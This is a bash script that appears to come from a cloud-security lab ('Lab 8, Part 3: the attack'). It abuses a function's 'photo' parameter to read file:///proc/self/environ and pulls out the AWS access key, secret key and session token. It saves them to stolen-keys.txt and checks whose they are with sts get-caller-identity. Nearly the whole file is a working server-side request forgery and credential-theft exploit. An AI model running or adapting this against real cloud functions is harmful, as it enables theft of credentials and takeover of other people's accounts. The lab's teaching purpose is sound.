#!/bin/bash
# Lab 8, Part 3: the attack. Asks the menu for the "photo"
# file:///proc/self/environ (the function's own environment), keeps the
# role's three keys in stolen-keys.txt, and says whose keys they are.
# Run only against your own function.
. "$(dirname "$0")/names.sh"
URL=$(function_url)
if [ -z "$URL" ] || [ "$URL" = None ]; then
  echo "$FN has no function URL. Do Step 1.4."
  exit 1
fi
ENVIRON=$(curl -s "${URL}?photo=file:///proc/self/environ" | tr '\0' '\n')
KEYS=$(echo "$ENVIRON" \
  | grep -E '^AWS_(ACCESS_KEY_ID|SECRET_ACCESS_KEY|SESSION_TOKEN)=')
if [ "$(echo "$KEYS" | grep -c .)" != 3 ]; then
  echo "No keys: the menu did not give its environment. It answered:"
  echo "$ENVIRON" | head -n 5
  echo "$(date -u +%FT%TZ) steal refused" >> "$LOG"
  exit 0
fi
echo "$KEYS" > "$HERE/stolen-keys.txt"
echo "$(date -u +%FT%TZ) steal ok" >> "$LOG"
echo "Stolen keys, saved in stolen-keys.txt:"
echo "$KEYS" | cut -c1-60 | sed 's/$/.../'
echo
echo "Whose keys are they?"
env $KEYS aws sts get-caller-identity --query Arn --output text
